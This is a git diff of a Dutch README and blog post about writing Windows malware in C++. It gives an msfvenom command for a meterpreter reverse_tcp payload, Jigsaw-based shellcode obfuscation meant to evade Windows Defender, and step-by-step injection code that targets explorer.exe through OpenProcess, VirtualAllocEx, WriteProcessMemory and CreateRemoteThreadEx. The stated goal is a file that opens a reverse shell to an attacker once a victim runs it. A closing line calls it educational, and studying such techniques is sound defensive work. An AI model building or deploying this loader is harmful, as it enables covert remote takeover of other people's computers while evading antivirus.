@@ -1,27 +1,61 @@
-Welkom bij deel 2 van mijn blogserie, "Mijn reis door malware development". In dit deel ga ik een eigen stukje malware ontwikkelen met behulp van **shellcode injection**. 
+**Welkom bij de repository gebruikt tijdens de blogserie, "Mijn reis door malware-ontwikkeling". Hier kan de code gevonden worden die gebruikt is tijdens dit project.**
+
+## Waarom C++?
+Voor dit project heb ik de keuze gemaakt om malware te gaan schrijven in C++, uit mijn In-depth research bleek dat veel ransomware (malware) in de praktijk zijn geschreven in C of C++. Deze talen bieden directe toegang tot **system resources** en de **Win32 API**, waardoor ze zeer geschikt zijn voor het manipuleren van processen en geheugen. Zoals ik in deel 1 heb behandeld, is mijn kennis op gebied van softwareontwikkeling gering. De programmeertaal C ondersteunt geen klassen of objecten, waardoor het voor iemand met beperkte kennis op gebied van softwareontwikkeling heel lastig wordt. Daardoor heb ik de keuze gemaakt om voor de programmeertaal C++ te kiezen, hoewel dit een lastige taal is, heb ik besloten om de uitdaging aan te gaan. Als beginner in C++ heb ik veel geoefend, documentatie raad gepleegd (met name de documentatie van Microsoft) en verschillende iteraties gemaakt van mijn malware.
+
+## Vereisten voor mijn Malware
+Voordat ik kan beginnen met ontwikkelen moet ik eerst duidelijk hebben wat ik wil gaan ontwikkelen. Hiervoor heb ik een lijstje gemaakt van eisen en stappen waar mijn malware aan moet voldoen:
+
+1. **Memory Injection** toepassen, ik moet de malware kunnen injecteren op een bestaand proces binnen Windows.
+2. De malware moet niet (snel) te detecteren zijn door **Windows Defender**.
+3. Het proces moet volledig automatisch verlopen, een slachtoffer zou alleen maar het bestand hoeven uit te voeren.
+4. De malware moet een **Reverse Shell** kunnen openen naar de aanvaller in kwestie.
+
+Genoeg introductie, nu gaan we over naar het ontwikkelen van malware!
 
 ---
 
-### Overzicht van de techniek
-
-Shellcode injection is een klassieke techniek in malwareontwikkeling. Het proces bestaat uit de volgende stappen:
+> _Disclaimer_: De code is geschreven aan de hand van de volgende twee bronnen: [Malware Development: Process Injection](https://www.youtube.com/watch?v=A6EKDAKBXPs&t=2529s) en [Malware development 101: Creating your first ever MALWARE](https://www.youtube.com/watch?v=zEk3mi4Pt_E). Verder is GitHub Copilot gebruikt om de code te verbeteren. 
+## Overzicht van de techniek
+Zoals in de vereisten is vast gesteld wordt er voor het maken van deze malware gebruik gemaakt van **Memory Injection**, hierbij wordt er een stuk [**Shellcode**](https://www.techtarget.com/searchsecurity/answer/What-is-the-relationship-between-shellcode-and-exploit-code) in het geheugen geïnjecteerd waardoor er een **Reverse Shell** wordt geopend. Het proces bestaat uit de volgende stappen:
 
 1. **Een handle verkrijgen naar het doelproces** door een bestaand proces te openen.
 2. **Geheugen reserveren in het doelproces** met de juiste permissies.
 3. **Shellcode reconstrueren en schrijven naar het toegewezen geheugen** in het proces.
-4. **Een nieuwe thread starten** in het doelproces om de shellcode uit te voeren.
+4. **Een nieuwe thread starten** in het doelproces om de shellcode uit te voeren
 
-In deze blogpost maken we gebruik van de **Win32 API**. Hoewel dit in eerste instantie intimiderend kan lijken, biedt het een krachtige set tools voor malwareontwikkeling.
+Om dit waar te kunnen maken wordt er gebruik gemaakt van de **Win32 API**, in het komende stuk leg ik uit welke functies er gebruikt worden en wat ze precies inhouden.
 
----
+## Gebruikte API-calls
+>De volledige documentatie van de **API-calls** en ook de **Win32 API** zijn te vinden op de [Microsoft Documentation Pages](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).
 
-### Obfuscatie van shellcode met Jigsaw
+Voor het maken van de malware zijn de volgende **API-calls** gebruikt, deze worden hieronder in detail besproken:
 
-Bij het genereren van shellcode om een TCP-reverse shell te creëren, gebruiken we de tool **Jigsaw** voor obfuscatie. Deze tool splitst de shellcode in kleine stukjes en husselt ze door elkaar. De oorspronkelijke positie van elk stukje wordt opgeslagen in een aparte array. Dankzij de functie `reconstruct_shellcode` kan de shellcode vervolgens in de juiste volgorde worden hersteld voordat deze wordt geïnjecteerd. Dit verhoogt de kans om antivirusdetectie te omzeilen.
+- **OpenProcess**: Deze functie wordt gebruikt om een handle naar een doelproces te verkrijgen. Met een geldig handle kunnen we toegang krijgen tot het geheugen van het doelproces en het manipuleren.
+- **VirtualAllocEx**: Deze API-functie reserveert geheugen in het doelproces. Het gereserveerde geheugen biedt een veilige ruimte waarin we onze shellcode kunnen plaatsen en uitvoeren.
+- **WriteProcessMemory**: Hiermee schrijven we de shellcode naar de eerder toegewezen geheugenbuffer in het doelproces. Dit is een belangrijke stap om ervoor te zorgen dat onze payload klaarstaat voor uitvoering.
+- **CreateRemoteThreadEx**: Deze functie start een nieuwe thread in het doelproces, die begint met de uitvoering van onze shellcode. Dit is de laatste stap in het injectieproces om de payload actief te maken.
+- **CreateToolhelp32Snapshot**: Hiermee maken we een snapshot van alle actieve processen op het systeem. Deze snapshot biedt de basis voor het identificeren van het doelproces waarin we willen injecteren.
+- **Process32First/Process32Next**: Met deze functies doorlopen we de processen in de snapshot, zodat we het juiste doelproces kunnen vinden op basis van de naam of andere criteria.
 
-**Codefragment voor reconstructie:**
+## Obfuscation met Jigsaw
+De malware moet voorzien zijn van een **Reverse Shell**, om deze shell te creëren, heb ik gebruik gemaakt van **msfvenom**, een tool die onderdeel is van het **Metasploit Framework**. Om de **Shellcode** te genereren heb ik de volgende commando gebruikt:
+```shell
+msfvenom --platform --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f c --var-name=shellcode -o payload.bin
+```
 
+Met dit commando genereerde ik een payload die een verbinding opzet naar een specifieke host en poort, zodat een remote shell toegankelijk wordt. Omdat Metasploit een veelgebruikte en bekende tool is, zijn de gegenereerde shellcodes vaak gedetecteerd door antivirussoftware. Hier komt de tool **Jigsaw** goed van pas. Jigsaw splitst de gegenereerde shellcode in kleine stukjes en husselt deze door elkaar. De oorspronkelijke positie van elk stukje wordt opgeslagen in een aparte array, zodat de code later opnieuw kan worden opgebouwd.
+
+[Jigsaw](https://github.com/RedSiege/Jigsaw)
+
+De `reconstruct_shellcode` functie kan de **Shellcode** in de juiste volgorde herstellen voordat deze geïnjecteerd wordt. Hiermee kan antivirus detectie omzeild worden.
 ```c++
+unsigned char jigsaw[511] = { 0x49, 0x5a ... 0x24 };
+int positions[511] = { 159, 187 ... 147 };
+int calc_len = 511;
+unsigned char calc_payload[511] = { 0x00 };
+int position;
+
 void reconstruct_shellcode() {
     for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
         position = positions[idx];
@@ -30,36 +64,17 @@ void reconstruct_shellcode() {
 }
 ```
 
-Hierdoor wordt de oorspronkelijke shellcode in de juiste volgorde herbouwd, klaar om te worden geïnjecteerd.
+## Een handle verkrijgen met OpenProcess
+De eerste stap om **Memory Injection** toe te passen is het verkrijgen van toegang tot het proces wat we willen injecteren. Dit doen we met de functie `OpenProcess`. Met een geldige handle kunnen we het geheugen van het doelproces manipuleren, wat het mogelijk maakt om later onze **Shellcode** te kunnen injecteren.
 
----
-
-### Gebruikte API-calls
-
-Voor de implementatie maken we gebruik van de volgende belangrijke functies uit de Win32 API:
-
-- **OpenProcess**: Voor het verkrijgen van een handle naar een doelproces.
-- **VirtualAllocEx**: Voor het reserveren van geheugen in het doelproces.
-- **WriteProcessMemory**: Om de shellcode naar de toegewezen geheugenbuffer te schrijven.
-- **CreateRemoteThreadEx**: Om een nieuwe thread te starten die de shellcode uitvoert.
-- **CreateToolhelp32Snapshot**: Voor het maken van een snapshot van actieve processen.
-- **Process32First/Process32Next**: Voor het doorlopen van processen in de snapshot om het juiste proces te vinden.
-
-Laten we elke stap nu gedetailleerd bespreken.
-
----
-
-### Stap 1: Een handle verkrijgen met OpenProcess
-
-De eerste stap in het proces is het verkrijgen van toegang tot het doelproces. Dit doen we met de functie `OpenProcess`. Met een geldig handle kunnen we het geheugen van het doelproces manipuleren, wat essentieel is voor onze injectie.
+[Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
 
 Wanneer we `OpenProcess` aanroepen, specificeren we drie parameters:
-
 - `dwDesiredAccess` bepaalt welke rechten we nodig hebben. In ons geval kiezen we `PROCESS_ALL_ACCESS` om volledige controle over het doelproces te verkrijgen.
-- `bInheritHandle` bepaalt of child-processen dit handle mogen erven. Hier zetten we dit op `FALSE` omdat we alleen in het huidige proces willen werken.
+- `bInheritHandle` bepaalt of **child-process** de handle mogen overnemen. Hier zetten we dit op `FALSE` omdat we alleen in het huidige proces willen werken.
 - `dwProcessId` is de unieke ID van het doelproces. Dit stelt ons in staat precies dat proces te openen dat we willen manipuleren.
 
-Wanneer `OpenProcess` succesvol is, retourneert het een geldig handle. Als de functie faalt, retourneert het `NULL`, en kunnen we met `GetLastError` de foutcode achterhalen om te begrijpen wat er misging.
+Wanneer `OpenProcess` succesvol is, geeft het een geldige handle terug. Als de functie faalt, retourneert het `NULL`, en kunnen we met `GetLastError` de foutcode achterhalen om te begrijpen wat er misging.
 
 ```c++
 void openHandleToProcess(DWORD processID) {
@@ -71,17 +86,14 @@ void openHandleToProcess(DWORD processID) {
 }
 ```
 
-In dit fragment zien we hoe de handle wordt geopend en hoe we loggen of deze stap succesvol was. Met dit handle hebben we nu de mogelijkheid om het geheugen van het doelproces te bewerken.
+### Processen doorzoeken met CreateToolhelp32Snapshot
+Nadat we weten welk proces we willen targeten, moeten we het proces identificeren in de lijst van actieve processen. Hiervoor gebruiken we `CreateToolhelp32Snapshot`, een functie waarmee we een snapshot maken van alle actieve processen. Ik heb ervoor gekozen om het `explorer.exe`-proces te targeten, omdat dit proces altijd actief is en geen verhoogde privileges vereist om te injecteren.
 
----
+[CreateToolhelp32Snapshot function (tlhelp32.h)](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
 
-### Stap 2: Processen doorzoeken met CreateToolhelp32Snapshot
+Wanneer de snapshot eenmaal is gemaakt, doorlopen we de processen met behulp van `Process32First` om het eerste proces op te halen, en `Process32Next` om door de lijst te gaan. Bij elk proces vergelijken we de naam met de naam van ons doelproces. Zodra we een match vinden, slaan we de process ID (PID) op en gaan we verder met de injectie.
 
-Nadat we weten welk proces we willen targeten, moeten we het specifieke proces identificeren in de lijst van actieve processen. Hiervoor gebruiken we `CreateToolhelp32Snapshot`, een handige functie waarmee we een momentopname maken van alle actieve processen.
-
-Wanneer de snapshot eenmaal is gemaakt, doorlopen we de processen met behulp van `Process32First` om het eerste proces op te halen, en `Process32Next` om door de lijst te itereren. Bij elk proces vergelijken we de naam met de naam van ons doelproces. Zodra we een match vinden, slaan we de process ID (PID) op en gaan we verder met de injectie.
-
-```C++
+```c++
 void injectIntoProcess(const wchar_t* processName) {
     reconstruct_shellcode();
 
@@ -116,17 +128,13 @@ void injectIntoProcess(const wchar_t* processName) {
 }
 ```
 
-Hier gebruiken we een snapshot van de actieve processen om het juiste proces te vinden. Zodra een match is gevonden, wordt de injectieprocedure gestart.
+### Geheugen toewijzen met VirtualAllocEx
+Nadat we onze proces hebben gevonden en een handle hebben verkregen, kunnen we een geheugenbuffer toewijzen waarin de shellcode wordt geplaatst. Dit doen we met `VirtualAllocEx` functie. Deze functie reserveert en wijst geheugen toe binnen de adresruimte van het gewilde proces, wat van belang is om onze shellcode later uit te voeren.
 
----
-
-### Stap 3: Geheugen toewijzen met VirtualAllocEx
-
-Nadat we toegang hebben verkregen tot het doelproces, moeten we een geheugenbuffer toewijzen waarin de shellcode wordt geplaatst. Dit doen we met `VirtualAllocEx`. Deze functie reserveert en wijst geheugen toe binnen de adresruimte van het doelproces, wat cruciaal is om onze shellcode later uit te voeren.
+[Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
 
 De belangrijkste parameters van `VirtualAllocEx` zijn:
-
-- `hProcess`: Dit is de handle naar het doelproces waarin we geheugen willen reserveren.
+- `hProcess`: Dit is de handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin we geheugen willen reserveren. 
 - `lpAddress`: Het startadres van de buffer. We gebruiken hier `NULL`, zodat Windows automatisch een geschikt adres kiest.
 - `dwSize`: De grootte van de buffer. Dit komt overeen met de grootte van onze shellcode.
 - `flProtect`: De beschermingsinstellingen voor het geheugen. We kiezen hier voor `PAGE_EXECUTE_READWRITE` zodat het geheugen kan worden gelezen, beschreven en uitgevoerd.
@@ -138,13 +146,17 @@ void allocateMemory() {
 }
 ```
 
-Dit fragment reserveert een buffer waarin de shellcode wordt opgeslagen. Dankzij de juiste permissies kan de code worden uitgevoerd zodra deze is geladen.
-
----
-
-### Stap 4: Schrijven van shellcode met WriteProcessMemory
-
+### Schrijven van Shellcode met WriteProcessMemory
 Met de buffer klaar voor gebruik is het nu tijd om de shellcode naar het doelproces te schrijven. Dit doen we met `WriteProcessMemory`. Deze functie kopieert gegevens van ons eigen proces naar de eerder gereserveerde buffer in het doelproces.
+
+[WriteProcessMemory function (memoryapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
+
+De parameters van `WriteProcessMemory` zijn als volgt:
+- `hProcess`: Dit is het handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin we gegevens willen schrijven.
+- `lpBaseAddress`: Het adres van de buffer in het doelproces waar de gegevens moeten worden geschreven. Dit komt overeen met de buffer die we hebben gereserveerd met `VirtualAllocEx`.
+- `lpBuffer`: Een pointer naar de gegevens die we willen schrijven, in dit geval onze shellcode.
+- `nSize`: De grootte van de gegevens die moeten worden geschreven. Dit komt overeen met de grootte van onze shellcode.
+- `lpNumberOfBytesWritten`: Een optionele parameter die het aantal werkelijk geschreven bytes retourneert. We gebruiken hier `NULL`, omdat we deze waarde niet nodig hebben.
 
 ```c++
 void writeMemory() {
@@ -153,13 +165,20 @@ void writeMemory() {
 }
 ```
 
-Hiermee wordt de shellcode effectief geladen in het geheugen van het doelproces. Dit is een cruciale stap, omdat het ons in staat stelt om onze payload uit te voeren.
-
----
-
-### Stap 5: Thread aanmaken met CreateRemoteThreadEx
-
+### Thread aanmaken met CreateRemoteThreadEx
 De volgende stap is het starten van een nieuwe thread die de shellcode uitvoert. Hiervoor gebruiken we `CreateRemoteThreadEx`. Deze functie start een thread in het doelproces, waarbij het startadres wordt ingesteld op de locatie van onze shellcode.
+
+[CreateRemoteThread function (processthreadsapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
+
+De parameters van `CreateRemoteThreadEx` zijn als volgt:
+- `hProcess`: Het handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin de thread wordt aangemaakt.
+- `lpThreadAttributes`: Een pointer naar een `SECURITY_ATTRIBUTES`-structuur. Hier gebruiken we `NULL` om de standaardbeveiligingsdescriptor te hanteren.
+- `dwStackSize`: De grootte van de stack voor de nieuwe thread. Door dit op `0` te zetten, gebruikt de thread de standaard stackgrootte.
+- `lpStartAddress`: Het startadres van de threadfunctie. Dit is de locatie van onze shellcode, gecast naar `LPTHREAD_START_ROUTINE`.
+- `lpParameter`: Een optionele parameter die wordt doorgegeven aan de thread. We gebruiken hier `NULL`, aangezien onze shellcode geen extra gegevens nodig heeft.
+- `dwCreationFlags`: Flags die bepalen hoe de thread wordt aangemaakt. Hier geven we `0` door, zodat de thread onmiddellijk na creatie wordt uitgevoerd.
+- `lpAttributeList`: Optionele lijst met threadattributen. Voor ons doel is dit `0`.
+- `lpThreadId`: Een pointer naar een variabele waarin de thread-ID wordt opgeslagen. We gebruiken hiervoor de `TID`-variable.
 
 ```c++
 void createRemoteThread() {
@@ -173,13 +192,19 @@ void createRemoteThread() {
 }
 ```
 
-Met deze functie wordt de shellcode uitgevoerd binnen het doelproces.
-
----
-
-### Stap 6: Wachten op threaduitvoering en opruimen
-
+### Wachten op threaduitvoering en opruimen
 Na het starten van de thread is het belangrijk om te wachten tot de uitvoering is voltooid en vervolgens alle gebruikte resources netjes op te ruimen. Dit voorkomt geheugenlekken en andere problemen.
+
+[WaitForSingleObject function (synchapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
+
+De gebruikte functies in deze stap zijn:
+De `WaitForSingleObject` functie wacht totdat de opgegeven object handle in een signal state komt. In dit geval gebruiken we het om te wachten tot de thread volledig is uitgevoerd. De parameters zijn:
+-  `hHandle`: De handle naar het object (in dit geval de thread).
+- `dwMilliseconds`: De maximale tijd (in milliseconden) om te wachten. Door `INFINITE` te gebruiken, wachten we totdat de thread klaar is.
+
+[CloseHandle function (handleapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
+
+De `CloseHandle` functie sluit de handle naar een object om systeembronnen vrij te maken. Hier gebruiken we het om zowel de threadhandle (`hThread`) als de proceshandle (`hProcess`) te sluiten. Het correct afsluiten van handles is cruciaal om te voorkomen dat het systeem vastloopt of bronnen lekt.
 
 ```c++
 void waitForThread() {
@@ -196,13 +221,8 @@ void cleanup() {
 }
 ```
 
-Door de handles correct te sluiten, zorgen we voor een veilige en efficiënte afronding van het injectieproces.
-
----
-
 ### Wat gebeurt er in de `main` functie?
-
-De `main` functie is het startpunt van het programma en fungeert als coördinator. Hier wordt een instantie van de klasse `ProcessInjector` aangemaakt. Vervolgens wordt de methode `injectIntoProcess` aangeroepen met de naam van het doelproces, in dit geval `L"explorer.exe"`. Dit proces wordt gekozen omdat het vaak actief is en voldoende permissies heeft voor de injectie.
+De `main` functie is het startpunt van het programma, hier wordt een instance van de klasse `ProcessInjector` aangemaakt. Vervolgens wordt de methode `injectIntoProcess` aangeroepen met de naam van het doelproces, in dit geval `L"explorer.exe"`.  Zoals eerder besproken is dit proces gekozen omdat het vaak actief is en voldoende permissies heeft voor de injectie.
 
 ```c++
 int main(int argc, char* argv[]) {
@@ -213,17 +233,12 @@ int main(int argc, char* argv[]) {
 ```
 
 De `main` functie doet het volgende:
-
 1. **Initialisatie van de injector**: Een object van `ProcessInjector` wordt gemaakt, dat de logica voor het injecteren bevat.
-2. **Aanroepen van** `injectIntoProcess`: Dit start het proces van het injecteren van shellcode in het opgegeven doelproces.
+2. **Aanroepen van `injectIntoProcess`**: Dit start het proces van het injecteren van shellcode in het opgegeven doelproces.
 3. **Terugkeerwaarde**: De functie eindigt met `EXIT_SUCCESS`, wat aangeeft dat het programma succesvol is uitgevoerd.
 
-De `main` functie is eenvoudig gehouden om de nadruk te leggen op de gestructureerde aanpak binnen de `ProcessInjector` klasse. Dit maakt de code overzichtelijk en modulair.
-
 ---
+### Resultaat
+Met de bovenstaande stappen hebben we werkende malware ontwikkeld die gebruikmaakt van **Obfuscated Shellcode** en **Memory Injection**. Door gebruik te maken van `CreateToolhelp32Snapshot` hebben we het mogelijk gemaakt om processen automatisch te identificeren en selecteren. Vervolgens hebben we de shellcode geïnjecteerd en uitgevoerd binnen het doelproces, in dit geval het `explorer.exe` proces, omdat deze altijd beschikbaar is en weinig permissies vereist. Kortom, hebben we malware ontwikkeld die antivirussoftware kan omzeilen, automatisch het door ons gewilde proces kiest, en **Obfuscated Shellcode** (Reverse Shell) kan injecteren in de memory van het `explorer.exe` proces.
 
-### Resultaat en conclusies
-
-Met de bovenstaande stappen hebben we een eenvoudige maar functionele malware ontwikkeld die gebruikmaakt van shellcode injection. Door gebruik te maken van `CreateToolhelp32Snapshot` hebben we automatisch processen geïdentificeerd en het juiste proces geselecteerd. Deze techniek toont de kracht van het manipuleren van procesgeheugen via de Win32 API. In toekomstige delen van deze blogserie zullen we meer geavanceerde technieken verkennen, zoals encryptie van shellcode en anti-detectie-methoden.
-
-Let op: dit project is uitsluitend bedoeld voor educatieve doeleinden en mag alleen worden uitgevoerd in een gecontroleerde omgeving.
+>**Let op: dit project is uitsluitend bedoeld voor educatieve doeleinden en mag alleen worden uitgevoerd in een gecontroleerde omgeving.**
